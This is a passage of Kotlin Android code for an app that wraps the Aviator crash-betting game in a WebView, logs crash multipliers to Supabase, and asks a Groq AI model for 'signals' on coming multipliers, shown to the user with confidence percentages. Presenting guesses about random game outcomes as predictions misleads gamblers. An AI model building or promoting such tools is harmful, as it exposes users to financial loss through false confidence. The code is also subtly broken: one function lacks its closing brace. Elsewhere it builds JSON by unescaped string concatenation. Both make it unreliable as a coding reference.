                    setBarra("ERRO IA", e.message?.take(40) ?: "timeout", "#ef4444")
                }
            }
        }.start()
    }

    private fun processarRespostaGroq(resposta: String, minAgora: Int) {
        try {
            // ── Extrair o texto do content da resposta Groq de forma robusta ──
            // A resposta Groq tem formato: {"choices":[{"message":{"content":"..."}}]}
            // O content está escapado como string JSON — precisamos de unescapar correctamente
            var textoIA = ""
            val contentIdx = resposta.indexOf(""""content":""")
            if (contentIdx >= 0) {
                // Avançar para depois de "content":"
                var pos = contentIdx + 10
                while (pos < resposta.length && (resposta[pos] == ' ' || resposta[pos] == ':')) pos++
                if (pos < resposta.length && resposta[pos] == '"') {
                    pos++ // saltar a aspa de abertura
                    val sb = StringBuilder()
                    while (pos < resposta.length) {
                        val c = resposta[pos]
                        if (c == '\\') {
                            pos++
                            when (resposta.getOrNull(pos)) {
                                'n'  -> sb.append('\n')
                                'r'  -> sb.append('\r')
                                't'  -> sb.append('\t')
                                '"'  -> sb.append('"')
                                '\\' -> sb.append('\\')
                                else -> { sb.append('\\'); sb.append(resposta.getOrNull(pos) ?: "") }
                            }
                        } else if (c == '"') {
                            break // fim do content
                        } else {
                            sb.append(c)
                        }
                        pos++
                    }
                    textoIA = sb.toString()
                }
            }

            if (textoIA.isEmpty()) {
                runOnUiThread { analisandoIA = false; setBarra("ERRO IA", "Sem resposta da IA", "#ef4444") }
                return
            }

            // Extrair os valores com regex directamente do texto (mais robusto que parse JSON)
            val prot   = Regex(""""?protecao"?\s*:\s*([\d.]+)""").find(textoIA)?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.2f, 15f) ?: 0f
            val alcMin = Regex(""""?alcance_min"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            val alcMaxRaw = Regex(""""?alcance_max"?\s*:\s*"?([\d]+x?)"?""").find(textoIA)?.groupValues?.get(1) ?: ""
            val tendencia = Regex(""""?tendencia"?\s*:\s*"?([^",}\n]+)"?""").find(textoIA)?.groupValues?.get(1)?.trim() ?: ""
            val confianca = Regex(""""?confianca"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: 0

            // Validar que temos valores reais da IA
            if (prot == 0f || alcMin == 0 || alcMaxRaw.isEmpty()) {
                runOnUiThread { analisandoIA = false; setBarra("ERRO IA", "JSON incompleto: $textoIA".take(50), "#ef4444") }
                return
            }

            val alcMax = if (alcMaxRaw.endsWith("x")) alcMaxRaw else "${alcMaxRaw}x"
            sinalProtecao = if (prot % 1f == 0f) "${prot.toInt()}x" else "${String.format("%.2f", prot)}x"
            sinalAlcMin   = alcMin
            sinalAlcMax   = alcMax
            horaAtual     = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)

            val alcNum = alcMaxRaw.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
            val cor = when {
                alcNum >= 100 -> "#ec4899"
                alcNum >= 20  -> "#22c55e"
                alcNum >= 5   -> "#f59e0b"
                else          -> "#3b82f6"
            }

            runOnUiThread {
                sinaisAtivos = true
                analisandoIA = false
                ultimaAnaliseMs = System.currentTimeMillis()
                velasDesdeUltimaAnalise = 0
                mostrarSinalCompleto(sinalProtecao, "${sinalAlcMin}x → $sinalAlcMax", tendencia, confianca, cor, minAgora)
                if (relogioRunnable == null) iniciarRelogio()
            }
        } catch (e: Exception) {
            runOnUiThread { analisandoIA = false; setBarra("ERRO IA", e.message?.take(50) ?: "excecao", "#ef4444") }
        }
    private fun escapeJson(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) when (c) {
            '"'  -> sb.append("\\\"")
            '\\' -> sb.append("\\\\")
            '\n' -> sb.append("\\n")
            '\r' -> sb.append("\\r")
            '\t' -> sb.append("\\t")
            else -> sb.append(c)
        }
        return sb.append("\"").toString()
    }

    // ── RELÓGIO ───────────────────────────────────────────────────
    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() {
                if (sinaisAtivos && dentroDoAviator) verificarRelogio()
                handler.postDelayed(this, 1000)
            }
        }
        relogioRunnable = tick
        handler.post(tick)
    }

    private fun verificarRelogio() {
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        val seg = cal.get(Calendar.SECOND)

        // Nova hora — resetar flags mas manter sinal activo
        if (horaAgora != horaAtual) {
            horaAtual = horaAgora
            ultimoMinutoGerado = -1
            analisandoIA = false
        }

        if (!sinaisAtivos || sinalProtecao.isEmpty()) return

        val alcNum = sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
        val cor = when {
            alcNum >= 100 -> "#ec4899"
            alcNum >= 20  -> "#22c55e"
            alcNum >= 10  -> "#f59e0b"
            else          -> "#3b82f6"
        }
        val alcTxt = "${sinalAlcMin}x → $sinalAlcMax"
        val horaTxt = "${String.format("%02d",horaAgora)}:${String.format("%02d",minAgora)}"

        atualizarBarraCompleta(
            if (alcNum >= 20) "📈 SUBIDA FORTE" else if (alcNum >= 5) "📈 SUBIDA" else "➡️ LATERAL",
            horaTxt, sinalProtecao, alcTxt, cor
        )
    }

    // ── SUPABASE ──────────────────────────────────────────────────
    // ── Guardar vela (crash) no Supabase — tabela "velas" ────────
    // ── Limpar velas antigas no Supabase (manter só as últimas 250) ──
    private fun limparVelasAntigas() {
        Thread {
            try {
                // Apagar as mais antigas — manter as 250 mais recentes
                val conn = URL("$SUPA_URL/rest/v1/rpc/limpar_velas_antigas")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write("{}") }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun carregarVelasSupabase() {
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/velas?select=coeficiente&order=id.desc&limit=30")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()

                if (code !in 200..299) {
                    runOnUiThread {
                        setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                    }
                    return@Thread
                }

                // Extrair coeficientes do JSON: [{"coeficiente":1.23}, ...]
                val valores = Regex(""""coeficiente"\s*:\s*([\d.]+)""")
                    .findAll(resp)
                    .mapNotNull { it.groupValues[1].toDoubleOrNull() }
                    .filter { it >= 1.0 }
                    .toList()
                    .reversed() // Supabase retorna desc, inverter para cronológico

                runOnUiThread {
                    if (valores.isNotEmpty()) {
                        historicoVelas.clear()
                        historicoVelas.addAll(valores.takeLast(MAX_VELAS_LOCAL))
                        totalVelasSupabase = valores.size
                        val n = historicoVelas.size
                        if (n >= MIN_VELAS_ANALISE) {
                            setBarra("HISTORICO CARREGADO", "$n velas prontas", "#22c55e")
                            // Arrancar análise imediatamente com o histórico carregado
                            handler.postDelayed({ pedirSinalIA() }, 1500)
                        } else {
                            setBarra("A RECOLHER DADOS", "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                        }
                    } else {
                        setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                }
            }
        }.start()
    }

    private fun enviarVelaSupabase(coef: Double) {
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date())
        val json = """{"coeficiente":$coef,"timestamp":"$timestamp"}"""
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/velas").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                val code = conn.responseCode
                conn.disconnect()
                if (code in 200..299) {
                    runOnUiThread {
                        // Feedback visual breve
                    }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun enviarSupabase(tipoVal: String, valorVal: String) {
        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
    private fun verificarAtualizacao() {
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()

                if (code !in 200..299) return@Thread

                val versaoNova = Regex(""""versao"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val urlApk = Regex(""""url_apk"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val notas = Regex(""""notas"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: ""

                if (versaoNova != VERSAO_ATUAL) {
                    runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
        val msg = "Versao actual: $VERSAO_ATUAL\nNova versao: $versaoNova\n\n${if (notas.isNotEmpty()) "$notas\n\n" else ""}Deseja actualizar agora?"
        AlertDialog.Builder(this)
            .setTitle("Actualizacao disponivel!")
            .setMessage(msg).setCancelable(false)
            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
                try {
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(urlApk)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                } catch (_: Exception) {
                    Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show()
                }
            }
            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }
            .show()
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    private fun setBarra(acao: String, minutos: String, cor: String) =
        atualizarBarra(acao, minutos, "", "", cor)

    private fun mostrarSinalCompleto(protecao: String, alcance: String, tendencia: String, confianca: Int, cor: String, minAgora: Int) {
        runOnUiThread {
            val icone = when {
                tendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
                tendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
                else -> "➡️"
            }
            val confTxt = if (confianca > 0) " · $confianca%" else ""
            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "IA: SINAL ACTIVO"
            val horaTxt = "${String.format("%02d", horaAtual)}:${String.format("%02d", minAgora)}"
            atualizarBarraCompleta(tendTxt, horaTxt, protecao, alcance, cor)
        }
    }

    private fun atualizarBarraCompleta(acao: String, horario: String, protecao: String, alcance: String, cor: String) {
        runOnUiThread {
            // Linha 1: ícone de tendência + hora
            txtAcao.text = acao
            txtAcao.setTextColor(Color.parseColor(cor))
            txtMinutos.text = horario
            txtMinutos.setTextColor(Color.parseColor("#94a3b8"))

            // Linha 2: proteção e alcance com estilo diferenciado
            if (protecao.isNotEmpty()) {
                txtProtecao.text = "🛡 $protecao"
                txtProtecao.setTextColor(Color.WHITE)
                txtProtecao.background = pill("#1e3a2a")
            }
            if (alcance.isNotEmpty()) {
                txtAlcance.text = "🎯 $alcance"
                txtAlcance.setTextColor(Color.parseColor(cor))
                txtAlcance.background = pill(when (cor) {
                    "#22c55e" -> "#0f2d1a"
                    "#ec4899" -> "#2d0f1a"
                    "#f59e0b" -> "#2d1f0f"
                    else      -> "#0f1a2d"
                })
            }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#061510"; "#f59e0b" -> "#150f00"
                "#7c3aed" -> "#12082a"; "#ec4899" -> "#200810"
                "#3b82f6" -> "#080f20"
                else -> "#0f172a"
            }))
        }
    }

    private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
        runOnUiThread {
            txtAcao.text = acao; txtAcao.setTextColor(Color.parseColor(cor))
            txtMinutos.text = minutos; txtMinutos.setTextColor(Color.WHITE)
            if (protecao.isNotEmpty()) {
                txtProtecao.text = "Prot: $protecao"
                txtProtecao.setTextColor(Color.WHITE)
                txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
            }
            if (alcance.isNotEmpty()) {
                txtAlcance.text = "Alc: $alcance"
                txtAlcance.setTextColor(Color.WHITE)
                txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
            }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#071a0f"; "#f59e0b" -> "#1a1200"
                "#7c3aed" -> "#1a0a2e"; "#ec4899" -> "#2a0a1a"
                else -> "#0f172a"
            }))
        }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }
        layout.addView(TextView(this).apply {
            text = "CONFIGURACOES  v$VERSAO_ATUAL"; textSize = 15f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(4) }
        })
        layout.addView(TextView(this).apply {
            text = "Velas capturadas: ${historicoVelas.size}  |  Dentro do Aviator: ${if (dentroDoAviator) "Sim" else "Nao"}"
            textSize = 11f; setTextColor(Color.parseColor("#64748b"))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
        })
        layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("PEDIR SINAL A IA", "#7c3aed") {
            dialog.dismiss()
            analisandoIA = false
            if (historicoVelas.size >= 3) pedirSinalIA()
            else Toast.makeText(this, "Precisa de ${3 - historicoVelas.size} velas mais", Toast.LENGTH_LONG).show()
        })
        layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") {
            dialog.dismiss(); verificarAtualizacao()
        })
        layout.addView(btn("RECARREGAR SITE", "#334155") { dialog.dismiss(); webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login") })
        layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── DRAWABLES ─────────────────────────────────────────────────
    private fun circulo(cor: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor)) }
    private fun pill(cor: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(cor)) }
    private fun roundRect(bg: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(bg)) }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD
        isAllCaps = false; background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() {
        super.onDestroy(); webView.destroy()
        handler.removeCallbacksAndMessages(null)
    }
}
